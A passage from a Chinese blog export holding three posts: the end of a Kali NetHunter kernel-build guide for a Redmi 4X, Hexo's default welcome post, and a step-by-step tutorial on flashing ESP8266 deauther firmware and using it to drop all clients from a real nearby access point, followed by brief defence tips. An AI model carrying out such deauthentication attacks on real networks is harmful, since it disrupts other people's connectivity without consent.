<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">接着进入到<span class="string">&quot;Networking support&quot;</span> -&gt; <span class="string">&quot;Bluetooth subsystem support&quot;</span> -&gt; <span class="string">&quot;Bluetooth drivers support&quot;</span>  </span><br><span class="line">勾选以下几个选项:  </span><br><span class="line"><span class="string">&quot;HCI USB driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;Broadcom protocol support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek protocol support&quot;</span>  </span><br><span class="line"><span class="string">&quot;HCI UART driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;HCI BCM203x USB driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;HCI BPA10x USB driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;HCI BlueFRITZ! USB driver&quot;</span>  </span><br><span class="line">然后返回上一级菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/bluetooth_driver.png" alt="bluetooth-driver" title="bluetooth-driver"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">勾选以下几个选项：  </span><br><span class="line"><span class="string">&quot;Bluetooth Classic (BR/EDR) features&quot;</span>  </span><br><span class="line"><span class="string">&quot;RFCOMM protocol support&quot;</span>  </span><br><span class="line"><span class="string">&quot;RFCOMM TTY support&quot;</span>  </span><br><span class="line"><span class="string">&quot;BNEP protocol support&quot;</span>  </span><br><span class="line"><span class="string">&quot;HIDP protocol support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Bluetooth Low Energy (LE) features&quot;</span>  </span><br><span class="line">然后返回上一级菜单  </span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/bluetooth_subsystem.png" alt="bluetooth" title="bluetooth"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">进入到<span class="string">&quot;Wireless&quot;</span>  勾选以下几个选项：  </span><br><span class="line"><span class="string">&quot;nl80211 testmode command&quot;</span>  </span><br><span class="line"><span class="string">&quot;use statically compiled regulatory rules database&quot;</span>  </span><br><span class="line"><span class="string">&quot;cfg80211 wireless extensions compatibility&quot;</span>  </span><br><span class="line"><span class="string">&quot;Generic IEEE 802.11 Networking Stack (mac80211)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Enable mac80211 mesh networking (pre-802.11s) support&quot;</span>  </span><br><span class="line">然后返回上一级菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/wireless.png" alt="wireless" title="wireless"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">接着进入到<span class="string">&quot;Device Drivers&quot;</span> -&gt; <span class="string">&quot;Network device support&quot;</span> -&gt; <span class="string">&quot;USB Network Adapters&quot;</span>  </span><br><span class="line">勾选以下几个选项：  </span><br><span class="line"><span class="string">&quot;USB RTL8150 based ethernet device support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek RTL8152/RTL8153 Based USB Ethernet Adapters&quot;</span>  </span><br><span class="line"><span class="string">&quot;ASIX AX88xxx Based USB 2.0 Ethernet Adapters&quot;</span>  </span><br><span class="line"><span class="string">&quot;ASIX AX88179/178A USB 3.0/2.0 to Gigabit Ethernet&quot;</span>. </span><br><span class="line">然后返回上一级菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/usb_network.png" alt="usb_net" title="usb_net"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">接着进入到<span class="string">&quot;Wireless LAN&quot;</span>  </span><br><span class="line">勾选以下几个选项：  </span><br><span class="line"><span class="string">&quot;Atheros/Qualcomm devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;Atheros HTC based wireless cards support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Linux Community AR9170 802.11n USB support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Atheros mobile chipsets support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Atheros ath6kl USB support&quot;</span>  </span><br><span class="line"><span class="string">&quot;MediaTek devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;MediaTek MT7601U (USB) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ralink devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ralink driver support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek 8187 and 8187B USB support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek rtlwifi family of devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;RTL8723AU/RTL8188[CR]U/RTL819[12]CU (mac80211) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Include support for untested Realtek 8xxx USB devices (EXPERIMENTAL)&quot;</span>  </span><br><span class="line"><span class="string">&quot;ZyDAS devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB ZD1201 based Wireless device support&quot;</span>  </span><br><span class="line"><span class="string">&quot;ZyDAS ZD1211/ZD1211B USB-wireless support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Wireless RNDIS USB support&quot;</span>  </span><br><span class="line"></span><br><span class="line">在<span class="string">&quot;Ralink driver support&quot;</span>中勾选以下几个选项：  </span><br><span class="line"><span class="string">&quot;Ralink rt2500 (USB) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ralink rt2501/rt73 (USB) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ralink rt27xx/rt28xx/rt30xx (USB) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for rt33xx devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for rt35xx devices (EXPERIMENTAL)&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for rt3573 devices (EXPERIMENTAL)&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for rt53xx devices (EXPERIMENTAL)&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for rt55xx devices (EXPERIMENTAL)&quot;</span>  </span><br><span class="line"><span class="string">&quot;rt2800usb - Include support for unknown (USB) devices&quot;</span>  </span><br><span class="line"></span><br><span class="line">在<span class="string">&quot;Realtek rtlwifi family of devices&quot;</span> 中勾选</span><br><span class="line"><span class="string">&quot;Realtek RTL8192CU/RTL8188CU USB Wireless Network Adapter&quot;</span>  </span><br><span class="line">然后返回主菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/wireless_lan.png" alt="Atheros" title="Atheros">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/mediatek.png" alt="MediaTek" title="MediaTek">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/ralink.png" alt="Ralink" title="Ralink">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/realtek.png" alt="Realtek" title="Realtek">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/zydas.png" alt="ZyDAS" title="ZyDAS"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">进入到<span class="string">&quot;Device Drivers&quot;</span> -&gt; <span class="string">&quot;Multimedia support&quot;</span> 勾选：  </span><br><span class="line"><span class="string">&quot;Digital TV support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Software defined radio support&quot;</span>  </span><br><span class="line"><span class="string">&quot;Media USB Adapters&quot;</span>  </span><br><span class="line"></span><br><span class="line">在<span class="string">&quot;Media USB Adapters&quot;</span>中 勾选：  </span><br><span class="line"><span class="string">&quot;Airspy&quot;</span>  </span><br><span class="line"><span class="string">&quot;HackRF&quot;</span>  </span><br><span class="line"><span class="string">&quot;Mirics MSi 2500&quot;</span>  </span><br><span class="line">然后拉到最下面，取消勾选  <span class="string">&quot;Autoselect ancillary drivers (tuners, sensors, i2c, spi, frontends)&quot;</span>  </span><br><span class="line">取消勾选 <span class="string">&quot;I2C Encoders, decoders, sensors and other helper chips&quot;</span> 内所有选项  </span><br><span class="line">取消勾选 <span class="string">&quot;Customize TV tuners&quot;</span> 内除了 <span class="string">&quot;Rafael Micro R820T silicon tuner&quot;</span> 以外所有选项  </span><br><span class="line">在 <span class="string">&quot;Customise DVB Frontends&quot;</span> 内取消勾选除了：  </span><br><span class="line"><span class="string">&quot;Realtek RTL2830 DVB-T&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek RTL2832 DVB-T&quot;</span>  </span><br><span class="line"><span class="string">&quot;Realtek RTL2832 SDR&quot;</span>  </span><br><span class="line">以外所有的选项  </span><br><span class="line">然后返回主菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/multimedia.png" alt="Multimedia_support" title="Multimedia_support">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/media_usb.png" alt="Media_usb" title="Media_usb">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/unselect.png" alt="unselect" title="unselect">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/i2c_encoder.png" alt="I2C_EN" title="I2C_EN">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/custom_tv.png" alt="Custom_TV" title="Custom_TV"><br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/custom_dvb.png" alt="Custom_DVB" title="Custom_DVB"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">进入到<span class="string">&quot;Device Drivers&quot;</span> -&gt; <span class="string">&quot;HID support&quot;</span> 勾选：  </span><br><span class="line"><span class="string">&quot;Battery level reporting for HID devices&quot;</span>  </span><br><span class="line"><span class="string">&quot;/dev/hidraw raw HID device support&quot;</span>  </span><br><span class="line"><span class="string">&quot;User-space I/O driver support for HID subsystem&quot;</span>  </span><br><span class="line"><span class="string">&quot;Generic HID driver&quot;</span>  </span><br><span class="line">勾选<span class="string">&quot;Special HID drivers&quot;</span>  <span class="string">&quot;USB HID support&quot;</span>  <span class="string">&quot;HID over I2C transport layer&quot;</span>  内所有选项</span><br><span class="line">然后返回上一级菜单</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/hid_support.png" alt="HID_support" title="HID_support"><br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/special_hid.png" alt="Special_HID" title="Special_HID"><br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/usb_hid.png" alt="USB_HID" title="USB_HID">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/i2c_hid.png" alt="I2C_HID" title="I2C_HID"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">接着进入到<span class="string">&quot;Device Drivers&quot;</span> -&gt; <span class="string">&quot;USB support&quot;</span>  勾选：  </span><br><span class="line"><span class="string">&quot;Support for Host-side USB&quot;</span>  </span><br><span class="line"><span class="string">&quot;OTG support&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Modem (CDC ACM) support&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Wireless Device Management support&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Mass Storage support&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Serial Converter support&quot;</span>  </span><br><span class="line"></span><br><span class="line">在<span class="string">&quot;USB Serial Converter support&quot;</span> 中勾选：  </span><br><span class="line"><span class="string">&quot;USB Serial Console device support&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Generic Serial Drive&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Serial Simple Drive&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Winchiphead CH341 Single Port Serial Driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB CP210x family of UART Bridge Controllers&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB FTDI Single Port Serial Driver&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Prolific 2303 Single Port Serial Driver&quot;</span>  </span><br><span class="line"></span><br><span class="line">在<span class="string">&quot;USB Gadget Support&quot;</span>中勾选：  </span><br><span class="line"><span class="string">&quot;USB functions configurable through configfs&quot;</span>  </span><br><span class="line"><span class="string">&quot;Generic serial bulk in/out&quot;</span>  </span><br><span class="line"><span class="string">&quot;Abstract Control Model (CDC ACM)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Object Exchange Model (CDC OBEX)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Network Control Model (CDC NCM)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ethernet Control Model (CDC ECM)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ethernet Control Model (CDC ECM) subset&quot;</span>  </span><br><span class="line"><span class="string">&quot;QCRNDIS&quot;</span>  </span><br><span class="line"><span class="string">&quot;RNDIS&quot;</span>  </span><br><span class="line"><span class="string">&quot;RMNET_BAM&quot;</span>  </span><br><span class="line"><span class="string">&quot;Ethernet Emulation Model (EEM)&quot;</span>  </span><br><span class="line"><span class="string">&quot;Mass storage&quot;</span>  </span><br><span class="line"><span class="string">&quot;Function filesystem (FunctionFS)&quot;</span>  </span><br><span class="line"><span class="string">&quot;MTP gadget&quot;</span>  </span><br><span class="line"><span class="string">&quot;PTP gadget&quot;</span>  </span><br><span class="line"><span class="string">&quot;Accessory gadget&quot;</span>  </span><br><span class="line"><span class="string">&quot;Audio Source gadget&quot;</span>  </span><br><span class="line"><span class="string">&quot;Uevent notification of Gadget state&quot;</span>  </span><br><span class="line"><span class="string">&quot;MIDI function&quot;</span>  </span><br><span class="line"><span class="string">&quot;HID function&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Diag function&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB Serial Character function&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB CCID function&quot;</span>  </span><br><span class="line"><span class="string">&quot;USB QDSS function&quot;</span>  </span><br><span class="line">接着返回主菜单，退出并保存配置</span><br></pre></td></tr></table></figure>
<p>如图所示<br><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/usb_support.png" alt="USB_support" title="USB_support">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/usb_serial.png" alt="USB_Serial" title="USB_Serial">  </p>
<p><img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/nethunter/usb_gadget.png" alt="USB_Gadget" title="USB_Gadget"></p>
<h4 id="保存配置"><a href="#保存配置" class="headerlink" title="保存配置"></a>保存配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="variable">$&#123;args&#125;</span> savedefconfig</span><br></pre></td></tr></table></figure>



<h4 id="编译内核"><a href="#编译内核" class="headerlink" title="编译内核"></a>编译内核</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="variable">$&#123;args&#125;</span> 2&gt;&amp;1 | <span class="built_in">tee</span> kernel.log</span><br></pre></td></tr></table></figure>
<h4 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make <span class="variable">$&#123;args&#125;</span> INSTALL_MOD_PATH=<span class="string">&quot;.&quot;</span> INSTALL_MOD_STRIP=1 modules_install</span><br></pre></td></tr></table></figure>


<h2 id="0x07-构建NetHunter-Kernel-Installer内核包"><a href="#0x07-构建NetHunter-Kernel-Installer内核包" class="headerlink" title="0x07 构建NetHunter-Kernel-Installer内核包"></a>0x07 构建NetHunter-Kernel-Installer内核包</h2><h4 id="下载Kali官方构建脚本"><a href="#下载Kali官方构建脚本" class="headerlink" title="下载Kali官方构建脚本"></a>下载Kali官方构建脚本</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-project /root/kali-nethunter-project --depth=1</span><br></pre></td></tr></table></figure>
<h4 id="编辑机型列表"><a href="#编辑机型列表" class="headerlink" title="编辑机型列表"></a>编辑机型列表</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /root/kali-nethunter-project/nethunter-installer/devices/  </span><br><span class="line"><span class="built_in">touch</span> /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg  </span><br><span class="line">vim /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg  </span><br></pre></td></tr></table></figure>
<p>按照<a href="https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-devices#how-to-add-a-newunsupported-device">官方教程</a>，添加以下内容并保存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Xiaomi Redmi4X for crDroid Android 11  </span></span><br><span class="line">[santoni]  </span><br><span class="line">author = <span class="string">&quot;DroidKali&quot;</span>  </span><br><span class="line"><span class="built_in">arch</span> = arm64  </span><br><span class="line">version = <span class="string">&quot;v1.0&quot;</span>  </span><br><span class="line">flasher = anykernel  </span><br><span class="line">modules = 1  </span><br><span class="line">slot_device = 0  </span><br><span class="line">block = /dev/block/bootdevice/by-name/boot  </span><br><span class="line">devicenames = santoni,Redmi4x  </span><br></pre></td></tr></table></figure>
<h4 id="创建机型对应的文件夹"><a href="#创建机型对应的文件夹" class="headerlink" title="创建机型对应的文件夹"></a>创建机型对应的文件夹</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules  </span><br></pre></td></tr></table></figure>
<h4 id="复制所需要的文件"><a href="#复制所需要的文件" class="headerlink" title="复制所需要的文件"></a>复制所需要的文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> out/arch/arm64/boot/Image.gz-dtb /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni  </span><br><span class="line"><span class="built_in">rm</span> -rf out/lib/modules/<span class="variable">$&#123;make kernelversion&#125;</span>-NetHunter/source  </span><br><span class="line"><span class="built_in">rm</span> -rf out/lib/modules/<span class="variable">$&#123;make kernelversion&#125;</span>-NetHunter/build  </span><br><span class="line"><span class="built_in">cp</span> -r out/lib/modules/<span class="variable">$&#123;make kernelversion&#125;</span>-NetHunter /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules/  </span><br></pre></td></tr></table></figure>
<h4 id="生成NetHunter-Kernnel-Installer安装包"><a href="#生成NetHunter-Kernnel-Installer安装包" class="headerlink" title="生成NetHunter-Kernnel-Installer安装包"></a>生成NetHunter-Kernnel-Installer安装包</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/kali-nethunter-project/nethunter-installer/  </span><br><span class="line">python3 build.py -d santoni --eleven --kernel</span><br></pre></td></tr></table></figure>

<h2 id="0x08-下载ADB-FASTBOOT工具包"><a href="#0x08-下载ADB-FASTBOOT工具包" class="headerlink" title="0x08 下载ADB-FASTBOOT工具包"></a>0x08 下载ADB-FASTBOOT工具包</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://dl.google.com/android/repository/platform-tools-latest-linux.zip</span><br><span class="line">unzip paltform-tools-latest-linux.zip -d /usr/share/</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&#x27;</span><span class="string">&#x27;export PATH=&quot;/usr/share/platform-tools:$PATH&quot;&#x27;</span><span class="string">&#x27;&#x27;</span> &gt; /root/.zshrc</span><br><span class="line"><span class="built_in">source</span> /root/.zshrc</span><br><span class="line"><span class="built_in">rm</span> -rf platform-tools-latest-linux.zip</span><br></pre></td></tr></table></figure>

<h2 id="0x09-刷入内核安装包"><a href="#0x09-刷入内核安装包" class="headerlink" title="0x09 刷入内核安装包"></a>0x09 刷入内核安装包</h2><h4 id="重启到Recovery模式"><a href="#重启到Recovery模式" class="headerlink" title="重启到Recovery模式"></a>重启到Recovery模式</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb reboot recovery</span><br></pre></td></tr></table></figure>
<h4 id="刷入内核刷机包"><a href="#刷入内核刷机包" class="headerlink" title="刷入内核刷机包"></a>刷入内核刷机包</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb sideload kernel-nethunter-eleven-santoni-20210905_111235.zip</span><br></pre></td></tr></table></figure>

<h2 id="0x10-相关链接"><a href="#0x10-相关链接" class="headerlink" title="0x10 相关链接"></a>0x10 相关链接</h2><p><a href="https://www.kali.org/docs/nethunter/">Kali NetHunter | Kali Linux Documentation</a>  </p>
<p><a href="https://gitlab.com/kalilinux/nethunter/">NetHunter gitlab repository</a>  </p>
<p><a href="https://zhuanlan.zhihu.com/p/24946336">“黑客手机”免费送-知乎专栏</a>  </p>
<p><a href="https://www.vuln.cn/7086">跟我把Kali NetHunter编译至任意手机</a>  </p>
<p><a href="https://forums.kali.org/showthread.php?44899-Building-a-kernel-for-the-Razor-Phone-2-Live-feed">Building a Kernel for the Razor Phone 2 - Live feed</a>  </p>
<p><a href="https://github.com/nathanchance/android-kernel-clang">Information on Compiling Android Kernels with Clang</a>  </p>
<p><a href="https://www.akr-developers.com/d/129">[内核向] - 交叉编译器的选择</a></p>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>NetHunter</tag>
        <tag>Android</tag>
        <tag>Kernel</tag>
        <tag>内核编译</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2018/12/04/hello-world.html</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<span id="more"></span>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>wifi-deauth-attack初探</title>
    <url>/2018/12/06/wifi-deauth-attack.html</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前段时间玩过一阵子ESP8266 WiFi Deauth攻击，闲的无聊来水一波文章！</p>
<span id="more"></span>
<h1 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h1><p>我们所使用的802.11 WiFi协议包含了一个Deauthentication(解除身份验证)的特性，其作用是为了将用户从无线网络中分离。而黑客们正是利用了WiFi的这个特性，使得黑客可以随时使用无线AP的伪造源地址，向无线AP设备发送一个或多个Deauthentication攻击数据包，从而使得合法客户端设备从无线AP设备上掉线。简单来说就是黑客可以随时让你的无线终端设备(例如智能手机，平板，笔记本)等设备从WiFi中掉线然后再也无法连接，除非黑客停止攻击。</p>
<p>该协议不需要对Deauthentication攻击框架进行加密，甚至是建立会话。该问题在<a href="https://www.networkworld.com/article/2312251/network-security/how-802-11w-will-improve-wireless-security.html">802.11w-2009</a>中有提及解决，但是几乎所有的无线AP设备厂商默认都禁用了这个属性，所以直到今天这个漏洞仍影响着全球近九成以上的无线AP设备。</p>
<h1 id="0x02-材料准备"><a href="#0x02-材料准备" class="headerlink" title="0x02 材料准备"></a>0x02 材料准备</h1><blockquote>
<p>·ESP8266 无线模块一块 (某宝自行搜索)<br>·一条Micro USB数据线 (有条件的话用USB转TTL也行)<br>·电脑一台 </p>
</blockquote>
<h1 id="0x03-环境准备"><a href="#0x03-环境准备" class="headerlink" title="0x03 环境准备"></a>0x03 环境准备</h1><blockquote>
<p>·Arduino IDE <a href="https://www.arduino.cc/en/Main/Software?setlang=cn">传送门</a><br>·NodeMcu Flasher <a href="https://github.com/nodemcu/nodemcu-flasher">传送门</a></p>
</blockquote>
<h1 id="0x03-刷入固件"><a href="#0x03-刷入固件" class="headerlink" title="0x03 刷入固件"></a>0x03 刷入固件</h1><p>首先把我们的ESP8266连接到电脑上，安装对应的驱动</p>
<blockquote>
<p>·CH340串口驱动 <a href="http://www.wch.cn/download/CH341SER_ZIP.html">传送门</a><br>·CP2102串口驱动 <a href="https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers">传送门</a></p>
</blockquote>
<p>接着我们去下载ESP8266专用的WiFi Deauth攻击固件，固件地址:</p>
<blockquote>
<p><a href="https://github.com/spacehuhn/esp8266_deauther/releases">https://github.com/spacehuhn/esp8266_deauther/releases</a></p>
</blockquote>
<p>这里需要注意的是固件的选择要根据你的模块Flash大小来选择，ESP-12的Flash大小为4MB，ESP-07的为1MB,ESP-01的为512KB&#x2F;1MB。详细说明可以参考<a href="https://github.com/spacehuhn/esp8266_deauther/wiki/Installation#flash-size">官方wiki</a><br>接下来我们开始刷入固件，打开NodeMcu Flasher，点击Config选项卡，选择你的固件，接着点击Advanced选项卡，在Baudrate(波特率)处选择115200，Flash size根据你的板子Flash大小来选择，我这里是ESP-12所以选择4MB，Flash speed选择80MHz，SPI mode选择DIO,最后我们点击Operation选项卡，在COM port处选择你的板子的端口，可以在windows的设备管理那里看到，然后点击Flash(F)按钮，接着就是等待固件烧录完成了。固件烧录完成后NodeMcu Flasher左下角的NODEMCU TEAM图标会变为绿色。</p>
<h1 id="0x04-攻击实战"><a href="#0x04-攻击实战" class="headerlink" title="0x04 攻击实战"></a>0x04 攻击实战</h1><p>接着我们打开手机WiFi设置，能搜索到一个SSID名为<em><strong>pwned</strong></em>的WiFi，这个就是我们烧录好固件之后生成的，密码为<em><strong>deauther</strong></em>，连接上去。接着我们打开手机浏览器，在地址栏输入<em><strong><a href="http://192.168.4.1/">http://192.168.4.1</a></strong></em>进入deauther的后台管理界面，如图:<img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/esp8266-scan.png" alt="esp8266-scan">由于最新<em><strong>v2.1.0</strong></em>版的固件自带了一个开机自动扫描AP的脚本，所以就不需要我们连上后再手动扫描了，当然如果你想得到更准确的结果的话你也可以重新扫描。扫描周围的无线热点后，我们选择一个目标开始攻击，这里我选择的FAST_4E14这个热点，然后选择攻击界面，如图:<img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/esp8266-attack.png" alt="esp8266-attack">选择Deauth攻击，接着刷新界面就能看到攻击效果了<img src="https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/esp8266-attacking.png" alt="esp8266-attacking">此时被攻击的无线AP上所有已连接的设备会全部掉线直至我们停止攻击。</p>
<h1 id="0x05-安全建议"><a href="#0x05-安全建议" class="headerlink" title="0x05 安全建议"></a>0x05 安全建议</h1><p>由于WiFi Deauth攻击是802.11协议上的一个缺陷造成的，所以目前并没有什么有效的防御措施，只能等无线联盟更新协议来弥补这个缺憾。个人的话尽量按照以下几点来做吧</p>
<blockquote>
<p>·路由设置白名单或MAC地址绑定<br>·开启访客WiFi<br>·隐藏SSID<br>·不用WiFi时尽量关闭路由</p>
</blockquote>
